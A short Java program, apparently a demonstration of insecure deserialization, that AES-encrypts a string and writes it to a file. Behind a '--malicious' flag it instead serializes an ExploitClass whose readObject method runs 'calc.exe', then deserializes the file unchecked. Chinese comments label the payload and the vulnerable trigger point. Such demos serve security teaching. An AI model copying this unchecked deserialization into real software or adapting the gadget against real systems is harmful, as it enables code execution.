import java.io.*;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.util.Base64;

public class FileEncryptionTool {
    static class EncryptedData implements Serializable {
        private final String data;
        private final String iv;
        
        EncryptedData(String data, String iv) {
            this.data = data;
            this.iv = iv;
        }
        
        String decrypt(SecretKey key) throws Exception {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(Base64.getDecoder().decode(iv)));
            return new String(cipher.doFinal(Base64.getDecoder().decode(data)));
        }
    }
    
    static class ExploitClass implements Serializable {
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            Runtime.getRuntime().exec("calc.exe");
        }
    }
    
    public static void main(String[] args) throws Exception {
        SecretKey key = KeyGenerator.getInstance("AES").generateKey();
        
        // 模拟加密流程
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("data.ser"));
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        
        // 恶意构造攻击载荷
        if (args.length > 0 && args[0].equals("--malicious")) {
            oos.writeObject(new ExploitClass());
        } else {
            String plainText = "Secret Document Content";
            String iv = Base64.getEncoder().encodeToString(cipher.getIV());
            String encrypted = Base64.getEncoder().encodeToString(cipher.doFinal(plainText.getBytes()));
            oos.writeObject(new EncryptedData(encrypted, iv));
        }
        oos.close();
        
        // 漏洞触发点：不安全的反序列化
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("data.ser"));
        Object obj = ois.readObject();
        
        if (obj instanceof EncryptedData) {
            System.out.println("Decrypted: " + ((EncryptedData) obj).decrypt(key));
        }
    }
}